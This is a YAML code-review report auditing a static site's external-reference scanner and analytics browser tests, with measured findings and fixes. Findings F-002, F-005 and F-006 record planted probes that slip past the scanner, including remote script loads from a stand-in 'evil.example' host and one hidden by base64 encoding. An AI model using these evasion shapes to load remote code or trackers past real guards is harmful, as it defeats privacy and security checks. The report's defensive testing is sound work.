findings:
  - id: F-001
    severity: high
    category: correctness
    type: defect
    gating: true
    file: tests/test_public_player_pages.py
    line: 2431
    title: "AC-390's browser journey runs on the COUNTED tree with no interception, so the suite fetches a third-party script over the public internet -- 3 x HTTP 200 measured"
    description: |
      `test_assembled_site_is_self_contained`'s step (4c) calls
      `_serve(direct.site_dir)` -- `direct` is assembled WITH
      `analytics=(ALLOW_RUNTIME["count"], ALLOW_RUNTIME["script"])` -- and then
      drives three pages in Chromium. Unlike
      `test_pages_work_with_analytics_blocked`, it installs NO `page.route`
      interceptor. The pages carry a live `<script async src=...>` pointing at
      the GoatCounter script host.

      MEASURED, by a probe test in a scratch worktree at af160fd5 that attaches
      `page.on("request")`, `page.on("response")` and `page.on("requestfailed")`
      to the same `counted_host`/`_open_pages`/`_open_play` journey:

        TOTAL REQUESTS: 19
        NON-SAME-ORIGIN REQUESTS: ['<the GoatCounter script host>/count.js']
        FOREIGN RESPONSES: [(200, ...), (200, ...), (200, ...)]
        FOREIGN FAILURES: []

      Three HTTP 200 responses from a third party, once per page door, every run
      of the suite. No pageview beacon to the count endpoint was observed, most
      likely because the vendor's script skips a `127.0.0.1` host -- but that is
      vendor behaviour nothing in this repository asserts or records, so "the
      owner's numbers are not polluted" is a hope, not a measurement.

      Three separate things are wrong with it:
      (a) it contradicts docs/deploy/player.md's own Drift-check step 4, "Do not
          count locally ... so development traffic is not in the owner's numbers".
          A test run is a local run;
      (b) it makes a test depend on a third party's availability and on an
          undocumented localhost policy. Nothing asserts on the script, so an
          airgapped machine stays green -- the dependency is silent, which is
          worse than a red;
      (c) it is the exact shape CARD-283/284's four same-origin controls exist to
          forbid, re-introduced from the test side.
    reproduction: >-
      In a scratch detached worktree at af160fd5, a probe test taking
      (browser_page, counted_host) with a request/response tap over
      `_open_pages(page, url, f"/b/{slug}")`, `_open_pages(page, url, "/library")`,
      `_open_play(page, url, keys["e10"])`, `_tap(page, 0, 0)`; then
      `page.wait_for_timeout(3000)`. Output above.
    recommendation: >-
      Keep the intent -- driving the DEPLOYED pages is right -- and add the two
      lines AC-391 already has, immediately after `_serve(direct.site_dir)`:
      `page.route(re.compile("|".join(re.escape(v.split("/")[2]) for v in
      ALLOW_RUNTIME.values())), lambda route: route.abort())`. VERIFIED: with that
      added, tests/test_public_player_pages.py -> 33 passed. Worth also asserting
      that something WAS aborted, so the interceptor cannot go vacuous the way
      AC-391's `assert blocked` prevents.
    confidence: high
    source: measured

  - id: F-002
    severity: high
    category: correctness
    type: gap
    gating: true
    file: tests/test_public_player_pages.py
    line: 2016
    title: "The comment stripper eats protocol-relative URLs, so `<script src=\"//host/x\">` and `url(\"//host/x\")` are SILENT PASSES -- and classify()'s own `//` branch is dead code"
    description: |
      `_COMMENTS`' third form is `re.compile(r"(?<!:)//[^\n]*")`, and
      `_without_comments` runs over every file BEFORE `_ATTR_TARGET`,
      `_IMPORT_TARGET`, `_CSS_TARGET` and `_URL_LITERAL` read it. The lookbehind
      guards only `://`. In `src="//host/x"` the character before `//` is a quote,
      not a colon, so the whole reference is blanked. `_ABSOLUTE_TARGET` runs on
      the unstripped text but requires `https?://`, so it does not see it either.

      Consequence, and this is the part that makes it structural rather than a
      typo: `classify()`'s `if target.startswith(("http://", "https://", "//"))`
      branch and `_URL_LITERAL`'s `//[A-Za-z0-9.-]+\.[A-Za-z]{2,}` alternative are
      UNREACHABLE. Both exist precisely to classify a protocol-relative target;
      neither can ever receive one, because the only patterns that could produce a
      `//` target read stripped text.

      MEASURED, planted into a copy of the clean counted site in a scratch
      worktree, then scanned with the real `scan_site` and the real allow-list:

        p1-protocol-relative.html  `<script src="//evil.example/t.js">`
            -> *** SILENT PASS *** {'foreign': [], 'identifiers': [], 'unclassifiable': []}
            stripped text: '<!doctype html>...<script src="\n'
        p7.css  `@font-face { src: url("//evil.example/f.woff2"); }`
            -> *** SILENT PASS ***
            stripped text: '@font-face { src: url("\n'

      A protocol-relative external script is the single cheapest way to add a
      tracker to a static site, and it is the shape the scanner most clearly
      believes it covers.

      This falsifies three stated claims:
      (a) `scan_site`'s docstring: "**A shape the scanner cannot classify is a
          FAILURE, never a silent pass**, which is the one property a
          denylist-shaped guard cannot have and this one is built around";
      (b) docs/deploy/player.md's allow-list section: the scan "fails on any
          external reference that is not here -- and on any reference whose
          target it cannot classify at all";
      (c) ADR-0039/R2's own escape clause, which is the clause the round relies
          on. R2 reads: "Where no such authority exists, the guard defaults to
          deny: a shape it cannot analyse is a FAILURE, never a silent pass".
          Default-deny is the CONDITION on the hand-written-set exemption, and it
          is not met.
    reproduction: >-
      Scratch worktree at af160fd5; a probe test taking (counted_site, tmp_path)
      that `shutil.copytree`s report.site_dir, writes the two files above into the
      copy, and prints `scan_site(probed, {**ALLOW_RUNTIME, **ALLOW_STATIC})`
      filtered to the probe's own name. Baseline asserted clean in the same run.
    recommendation: >-
      One character class. Change the `//` comment form to
      `re.compile(r"""(?<![:"'`])//[^\n]*""")` -- do not blank a `//` that is
      immediately preceded by a quote. VERIFIED in the scratch worktree: p1 and p7
      both become `{'foreign': ['...: //evil.example/t.js'], ...}`, the real tree
      stays clean on all three buckets, and tests/test_public_player_pages.py +
      the probes -> 42 passed. Then add a planted protocol-relative probe to
      test_no_homegrown_tracking's control set so the fix has a control, and strike
      the two overclaiming sentences in (a) and (b) or qualify them to the shapes
      actually covered.
    confidence: high
    source: measured

  - id: F-003
    severity: high
    category: maintainability
    type: landmine
    gating: true
    file: tests/test_public_player_pages.py
    line: 2794
    title: "`test_the_deploy_page_is_the_only_place_that_holds_an_endpoint` reds on ANY tracked file that quotes the endpoint -- meta/review/** included, so this board's own sync breaks it"
    description: |
      The test runs `git grep -l --fixed-strings <url>` with no pathspec over the
      whole tracked tree and asserts `files == [driver.DEPLOY_DOC.as_posix()]`.
      The intent is sound -- an allow-list with a second copy is not an allow-list
      -- but the scope is every tracked file, and this board SYNCS review YAMLs
      into main. So the endpoint string can never again appear in a review report,
      a card's round record, a CHANGELOG line, a postmortem, or a cross-reference
      from docs/deploy/render.md, without reddening the suite.

      MEASURED, in a scratch worktree at af160fd5: a single-line
      meta/review/CARD-285-probe.yml quoting the count endpoint, `git add`ed,
      then the node run:

        FAILED tests/test_public_player_pages.py::test_the_deploy_page_is_the_only_place_that_holds_an_endpoint
        tests/test_public_player_pages.py:2800: AssertionError
        Left contains one more item: 'meta/review/CARD-285-probe.yml'

      This is not hypothetical: cycle 2's report, or any later card's notes, will
      trip it. I had to deliberately avoid spelling either endpoint in THIS file
      (see dead_ref_hygiene), which is a constraint a guard should not put on its
      own reviewers.
    reproduction: "As above. `git rm --cached` + `rm` restored the tree; `git status --porcelain` clean afterwards."
    recommendation: >-
      Scope the search to the files that could be read as configuration. Minimal
      and verified: append a pathspec to the argv --
      `["git", "grep", "-l", "--fixed-strings", url, "--", ":!meta"]`. VERIFIED in
      the scratch worktree: with the probe YAML staged the node passes, and the
      assertion still reds on a second copy in player/, scripts/, tests/ or docs/,
      which is the whole of what it means to say. Say in the docstring that meta/
      is excluded and why (it is a record, not a configuration source).
    confidence: high
    source: measured

  - id: F-004
    severity: medium
    category: testing
    type: gap
    gating: false
    file: tests/test_public_player_pages.py
    line: 2600
    title: "ADR-0039/R3: the comment-stripping exemption has no control for what it must NOT absorb"
    description: |
      ADR-0039/R3 is mandatory and in this card's own System contract: "Every
      exemption a guard grants carries a control for what it must NOT absorb --
      caught with the exemption removed, missed with it in place."

      `_without_comments` is an exemption -- it is the one place the scan
      deliberately stops looking. The round states the limit it must not absorb
      ("`_ABSOLUTE_TARGET` runs on the UNSTRIPPED text, so a full URL in a comment
      is still reported") and `test_no_homegrown_tracking`'s four planted probes
      are probe-second-endpoint.html, probe-ip-read.js, probe-unreadable.js and
      probe-dangling.html. NONE of them is in a comment. The claim has no test.

      The claim is TRUE -- I measured it -- which is why this is medium and not
      high. Planted into a copy of the clean counted site:

        c1-url-in-comment.js       `// see https://evil.example/t.js for why`      -> CAUGHT (foreign)
        c3-url-in-block-comment.js `/* https://evil.example/t.js */`               -> CAUGHT (foreign)
        c4-url-in-html-comment.html `<!-- https://evil.example/t.js -->`           -> CAUGHT (foreign)
        c2-rooted-in-comment.js    `// see /not-in-this-tree.json for why`         -> SILENT PASS (intended)

      I also confirmed BOTH false positives the round designed around, by
      monkeypatching `_without_comments` to the identity on the real tree:

        {'unclassifiable': ["player.css: 'not yet decided' is neither absolute nor rooted at the site",
                            "solver_state.js: '/static/solver_state.js' resolves to no file, directory or rewrite"]}

      and the two sites: `player.css`'s `_IMPORT_TARGET` hit is literally
      `'from\n   "not yet decided"'`, and solver_state.js line 6 is
      "// browser test suite with `await import('/static/solver_state.js')`."
      Both diagnoses are exactly right and both fixes are the right ones.
    recommendation: >-
      Add c1/c3/c4 (or just c1) to the planted-probe set, asserting the hit lands
      in `foreign`. Four lines. That converts the asymmetry from a prose claim into
      a control, and it is where F-002's protocol-relative probe belongs too.
    confidence: high
    source: measured

  - id: F-005
    severity: medium
    category: correctness
    type: gap
    gating: false
    file: tests/test_public_player_pages.py
    line: 2062
    title: "Reference shapes the scanner does not look for at all are silent passes, not failures -- `el.src = <non-literal>`, `new Worker(...)`, `new Image().src = ...`"
    description: |
      The scan's soundness argument is "a target the scanner cannot read is a
      FAILURE, so the resolution only has to be sound, not complete". That holds
      for the shapes it looks for: I drove `fetch(obj.url)`, `fetch(param)`,
      `fetch(\`${base}/x\`)` and all land in `unclassifiable` correctly, and
      `URL_CALLS`'s one-hop `_assignments` is genuinely sound (literals-only, with
      the total-count check that makes it so).

      The hole is one level up: `URL_CALLS` and `_ATTR_TARGET` are the only two
      routes to a request target, and `_ATTR_TARGET` requires a QUOTE immediately
      after `=`. An attribute assigned from an expression therefore produces no
      shape at all -- the scanner never notices a reference is being made, so
      there is nothing to call unclassifiable.

      MEASURED, planted into a copy of the clean counted site:

        p2-src-from-nonliteral.js
            `const s = document.createElement("script");`
            `s.src = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvdC5qcw==");`
            `document.head.appendChild(s);`
            -> *** SILENT PASS *** on all three buckets
        p3-worker.js
            `const w = new Worker(window.name);`
            `const i = new Image(); i.src = window.name;`
            -> *** SILENT PASS ***
        p4-slashes-in-string.js
            `const sep = "a//b"; const u = "/not-in-this-tree.json"; fetch(u);`
            -> *** SILENT PASS *** (the declared comment-strip cost, measured: the
               bare `//` truncates the line and takes the fetch with it)

      Two shapes DO get caught, and the reasons are worth recording because they
      are luck rather than design: `window.location.assign("https://...")` is
      caught by `_ABSOLUTE_TARGET` on the raw text (only because the URL is a
      literal), and `new XMLHttpRequest()` is caught by IDENTIFIER_SHAPES' own
      trip-wire, not by any reference pass.

      Same R2 default-deny breach as F-002, by a different route. Separated
      because the fix is different and larger.
    recommendation: >-
      Make the absence of a readable target a shape in its own right: report
      `(?:src|href)\s*=\s*` not followed by a quote as `unclassifiable`, and add
      `Worker`, `Image`, `location.assign` and `window.open` to `URL_CALLS` (they
      already get the sound one-hop treatment for free). If a false positive turns
      up on the real tree, that is a named exemption under ADR-0039/R3 with its own
      control -- which is the shape the card already uses well elsewhere.
    confidence: high
    source: measured

  - id: F-006
    severity: medium
    category: correctness
    type: gap
    gating: false
    file: tests/test_public_player_pages.py
    line: 2573
    title: "The two allow-list blocks are a flat union, so \"non-runtime, nothing fetches it\" is documentary only -- a live `<script src>` to the non-runtime entry is permitted"
    description: |
      `scan_site` takes one `allow` dict, and every caller passes
      `{**ALLOW_RUNTIME, **ALLOW_STATIC}`. The distinction the deploy page draws
      -- "Runtime: the visitor's browser fetches these" vs. "Non-runtime: named
      here so the scanner can classify them ... Nothing fetches these at page
      load" -- has no mechanism behind it. Declaring a URL non-runtime grants it
      full runtime permission.

      MEASURED, planted into a copy of the clean counted site:

        c5-nonruntime-tracker.html
            `<script src="https://openapi.vercel.sh/vercel.json"></script>`
            -> *** SILENT PASS ***

      A live script tag to the non-runtime entry, in an HTML page, scans clean.
      The entry is harmless today; the shape is not, because the next non-runtime
      entry somebody adds (a schema, a docs link, a badge) silently becomes a
      permitted runtime egress channel.

      This is also the honest answer to "is the doc still a single allow-list in
      any meaningful sense": in the only sense the scan uses, yes -- it is one
      union. The two-block split is a comment.
    recommendation: >-
      Hold the split to its own claim: pass the two dicts separately and permit an
      `ALLOW_STATIC` member only in a file nothing fetches at page load -- today,
      only `vercel.json` -- so a non-runtime URL in any `.html`, `.js` or `.css`
      is `foreign`. With that, the declaration "nothing fetches these" becomes a
      measured property, and Control 1's shape (drop a member, watch it red)
      extends to the non-runtime block, which today has no control at all.
    confidence: high
    source: measured

  - id: F-007
    severity: low
    category: testing
    type: inaccuracy
    gating: false
    file: tests/test_public_player_pages.py
    line: 2527
    title: "AC-391 exempts by text OR located URL, not by located URL as the round reports; and `assert len(hosts) >= 1` should be an equality"
    description: |
      The round's record and the brief both say "the handler records
      `(text, location.url)` and exempts by the located URL". The code is
      `if not any(host in entry[0] or host in entry[1] for host in hosts)` -- an
      OR over text and URL, so a console error whose TEXT happened to contain an
      analytics host would also be absorbed.

      The property the round wanted still holds, and I proved it rather than
      reasoning about it: M-D plants a failed load of a PAGE asset on the counted
      tree and the test reds at :2531 with
      `('Failed to load resource: the server responded with a status of 404 (File
      not found)', 'http://127.0.0.1:.../missing-page-asset.css')` in
      `unexplained`. So this is a reporting inaccuracy plus a latent widening, not
      a live defect.

      Separately, `assert len(hosts) >= 1, hosts` is weaker than the derivation
      supports: `allow_list` guarantees both `count` and `script`, so two hosts
      are expected and a collapse to one (both endpoints on the same host) would
      pass unnoticed while halving what the interceptor blocks.
    recommendation: "Drop `host in entry[0] or` and exempt by `entry[1]` alone (M-D stays killed either way). Make the floor `assert sorted(hosts) == <the two derived from ALLOW_RUNTIME>` or at least `len(hosts) == 2`. Correct the sentence in the card's round record."
    confidence: high
    source: measured

  - id: F-008
    severity: low
    category: documentation
    type: gap
    gating: false
    file: docs/deploy/player.md
    line: 160
    title: "The bound is not stated where a reader meets the claim -- and the deploy page states the opposite"
    description: |
      The brief asks whether the declared/derived bound is "stated where a reader
      meets the claim". It is not. The honest statement of the split -- "This set
      is DECLARED, not derived, and that is this guard's one honest gap against
      ADR-0039/R2 ... a lexical set here can only ever be a trip-wire" -- lives in
      a comment above `IDENTIFIER_SHAPES` in a test module. Excellent writing, and
      nobody deploying the site will read it.

      Where a reader DOES meet the claim, docs/deploy/player.md's Usage-counting
      section, there is no bound at all: "Nothing we ship reads, stores or
      transmits a visitor's IP or any per-visitor identifier (ADR-0041/R6, G-3)",
      flat; and the allow-list section claims the scan "fails ... on any reference
      whose target it cannot classify at all", which F-002, F-005 and F-006
      measure to be false in four shapes.

      The page's own preamble sets a discipline it then does not follow for this:
      "A value is filled in only where there is evidence for it in the repository,
      and the evidence is dated." The reach of the scan is such a value.

      (Not a finding: the vendor privacy claims -- cookieless, no stored IP -- are
      sourced, DEC-046/ADR-0041 is cited at the section head and resolved.yml:236
      carries the decision. Those are fine.)
    recommendation: >-
      Two sentences in the Usage-counting section: what the scan derives (the
      references from the tree, the permitted set from this page, the routes from
      vercel.json) and what it declares (the identifier vocabulary, a trip-wire
      over a non-enumerable set), plus the shapes it does not read, once F-002/F-005
      are fixed. Then the sentence quoted above becomes true as written.
    confidence: high
    source: measured

  - id: F-009
    severity: low
    category: documentation
    type: undeclared_constraint
    gating: false
    file: player/assemble.py
    line: 441
    title: "`with_analytics`'s https-only, no-quote and single-`</head>` refusals are undeclared constraints"
    description: |
      `with_analytics` raises ValueError on a non-`https://` endpoint, on an
      endpoint containing a quote / `<` / whitespace, on a document that already
      carries the marker, and on a document with any count of `</head>` other than
      one. `allow_list` independently refuses a non-https entry in either block.

      Every one of these is RIGHT for a public site -- the quote check is an
      attribute-injection guard and the https check is not optional for a page
      served over TLS. None is stated in the card, in FR-045's ACs, or in
      docs/deploy/player.md. An owner who registers a self-hosted counter on
      `http://` will meet a ValueError from a line nothing told them about.

      `test_the_counting_snippet_goes_in_once_and_refuses_anything_else` holds all
      four refusals properly (I ran it; the different-endpoint case is the good
      one, and it is exactly what an attribute marker buys over a URL marker).
      This is a note about where the constraint is written down, not about whether
      it is tested.
    recommendation: "One line in the deploy page's allow-list section: both endpoints must be absolute https URLs with no quote or whitespace, and the helper refuses anything else. No registry change needed."
    confidence: high
    source: measured

  - id: F-010
    severity: info
    category: testing
    type: residual
    gating: false
    file: tests/test_public_player_pages.py
    line: 2454
    title: "\"The deployed tree is never the tested tree\" is FALSE as stated -- the counted tree is browser-tested twice; the real residual is narrower"
    description: |
      I disagree with the brief's framing, on a measurement. The counted tree IS
      loaded in Chromium by both new browser tests: AC-391 via `counted_host`, and
      AC-390 step (4c) via `_serve(direct.site_dir)` (which is F-001's defect, but
      it does mean the deployed pages are driven). The three doors and a mark are
      exercised on the counted tree in both.

      What is NOT observed on the counted tree is a full request-SET closure --
      neither test attaches `page.on("request")` and asserts every request is
      same-origin or allow-listed. CARD-283/284's four controls do that only on the
      uncounted tree (verified: tests/test_public_player.py:2069/:2318/:2698 and
      tests/test_public_player_pages.py:570 all take `pages_host`/`site`).

      I judge that ADEQUATELY COVERED for our own bytes, and the reason is the
      round's own assertion: `counted` and `uncounted` are byte-identical except
      for one snippet line in exactly the pages `report.counted` names, and that
      equality is mutation-resistant (M-B1/M-B3/M-B4 all killed). Uncounted is
      browser-closed; counted = uncounted + one allow-listed line; and the static
      scan reads every byte either tree holds. AC-391's `assert blocked` plus
      `all(any(host in request ...))` even observes that the counted page's egress
      attempt goes to an allow-listed host.

      The genuinely uncovered part is what the third-party script DOES once it
      runs, which is DEC-046's vendor premise and is not testable offline -- and
      which F-001 means the suite currently exercises for real without asserting
      anything about it. So the residual is "the vendor's script is unmeasured",
      not "the deployed tree is untested". A counted-tree egress control is cheap
      and would be worth having after F-001's interceptor lands (tap the requests
      on `counted_host`, assert each is same-origin or allow-listed), but I do not
      call it owed.
    recommendation: "Re-word the card's residual paragraph to this narrower claim. Optionally add the request tap to AC-391 once F-001's interceptor is in."
    confidence: high
    source: measured

judgements_requested:
  "1_counted_vs_uncounted_byte_assertion": >-
    IT GENUINELY CONSTRAINS. Driven, not reasoned about: three independent widening
    mutants, each killed at a DIFFERENT assertion line. A `<link rel=preconnect>`
    added alongside the tag dies at :2404 on the per-file byte equality; a page
    counted but left out of `report.counted` dies at :2399 (`differs ==
    sorted(direct.counted)`) AND at :2589 in AC-392; a non-html file changed by
    counting dies at :2399. A second tag cannot even be constructed --
    `with_analytics` refuses on the attribute marker, and that refusal is itself
    tested with a DIFFERENT endpoint, which is the case a URL-keyed marker would
    have admitted. This is the strongest thing in the card.
    On "the deployed tree is never the tested tree": the framing is false as
    stated -- see F-010. Adequately covered, with a narrower residual named.
  "2_edited_bookkeeping_test": >-
    TEETH KEPT, and in the catching direction STRENGTHENED. M-A: a fourth ref in
    requirements.yml naming a node nothing defines reds the test at :1919
    (`assert refs - defined == set()`). Before the edit the same half was
    `refs - defined == card_285`, an equality against three specific names -- which
    also caught a fourth, so nothing was lost. And `refs & defined == card_284 |
    card_285` now pins the intersection exactly, so a seventh ref for this file
    cannot be added silently either. The one direction NEITHER version covers is
    the docstring's own wording, "a ref that IS defined here must be in the
    registry": a NEW test defined here and absent from the registry grows `defined`
    only, leaves `refs` alone, and the intersection is unchanged. That wording was
    already there before this card and is still the weaker reading of what is
    asserted; worth correcting, not worth a finding. Also verified: NO Playwright
    suite body was edited -- tests/ has exactly one file in the diff
    (test_public_player_pages.py, 971/15), and tests/test_public_player.py and
    tests/test_puzzle_solver_page.py are byte-unchanged.
  "3_adr_0039_r2_declared_tripwire_plus_derived_closure": >-
    NOT SATISFIED AS IT STANDS, and the reason is R2's own text rather than taste.
    R2 reads: "A guard's set is derived from an authority the runtime can enumerate,
    not hand-written. Where no such authority exists, the guard defaults to deny: a
    shape it cannot analyse is a FAILURE, never a silent pass". So the round's
    structure -- declared trip-wire plus derived closure -- IS the structure R2
    prescribes, and the unenumerable-set argument is correct and well evidenced
    (CARD-282's 7-of-7 miss is the right precedent; 22 compound shapes; the
    `fingerprint` measurement reproduces at exactly 7 hits, 5 in solver_state.js
    and 2 in play.js, all grids). The derived half is also genuinely derived: I
    confirmed the references come from the tree's own files, the permitted set from
    docs/deploy/player.md through the driver's own parser (`driver.allow_list`, the
    same function the deploy command calls), and the routes from the tree's own
    vercel.json through CARD-283's `rewrites()`. Nothing is a literal in the test.
    But the exemption R2 grants is CONDITIONAL on default-deny, and default-deny is
    where it fails: four measured silent passes (F-002 x2, F-005 x2, plus F-006's
    scope hole). So today it is not a denylist wearing a derivation's clothes -- the
    derivation is real -- it is a derivation with holes in the half that carries the
    rule. ADR-0041/R6's load is on "the egress set is closed"; the egress set is not
    closed. Fix F-002 (one character class, verified) and F-005 and the argument
    becomes sound. And the bound is NOT stated where a reader meets the claim -- see
    F-008; the deploy page states the opposite.
  "4_comment_stripping_asymmetry": >-
    The asymmetry ITSELF is defensible and I verified both halves (C1/C3/C4 caught,
    C2 silent). A full URL is never prose and an endpoint parked in a comment is
    something a reviewer should see; a rooted path in a comment is documentation,
    and solver_state.js:6 is the real case that proves it. Being stricter on the
    absolute form costs nothing because both are inert. So: right asymmetry.
    BUT the heuristic that implements it is a hole, not just a declared cost. The
    docstring declares one cost -- "a string whose content held a bare `//` would be
    truncated" -- and I confirmed that cost is zero on today's tree (no bare `//`
    inside any quoted string in the served site). It does not declare the other
    consequence of the same regex, which is F-002: the stripper destroys LIVE
    protocol-relative references in code, and kills the two code paths written to
    classify them. That is the finding. The `//`-inside-a-string mis-handling is
    real and measured (p4) but secondary.
  "5_wanted_ac_392_wording": |
    I agree the wording is owed an amendment, and for exactly the reason the round
    gives -- "the only analytics endpoint" is singular, the integration is two
    origins, and vercel.json's $schema is a third external reference that is not
    analytics at all. A scanner enforcing the literal AC would have red on a file
    CARD-283 shipped. My exact wanted wording for requirements.yml FR-045 AC-392:

      given: the assembled site
      when:  its files are scanned
      then:  no reference in it names a visitor IP or a per-visitor identifier,
             every external reference it carries is one docs/deploy/player.md
             declares -- in that page's runtime allow-list for the endpoints a
             visitor's browser fetches, or in its non-runtime allow-list for
             references nothing fetches at page load -- and a reference shape the
             scan cannot classify is a failure
      kind:  negative
      test:  tests/test_public_player_pages.py::test_no_homegrown_tracking

    Three deliberate changes: "the only analytics endpoint" -> "every external
    reference ... one that page declares", which is both satisfiable and the
    stronger claim; the two blocks named without counting them, so adding a third
    runtime endpoint is a doc edit and not an AC edit; and the default-deny clause
    promoted into the AC, because it is the property F-002 and F-005 break and an
    AC that does not say it cannot notice. Counts stay out of the AC entirely -- the
    page is the authority, and `REQUIRED_RUNTIME` already closes the set the
    assembler needs. The identifier vocabulary's declared-trip-wire status belongs
    in the FR's comment block beside the AC, not in the `then:`.
  "6_card_amendments": "see card_amendments_owed"
  "7_measured_wrong": "see corrections_to_the_record"

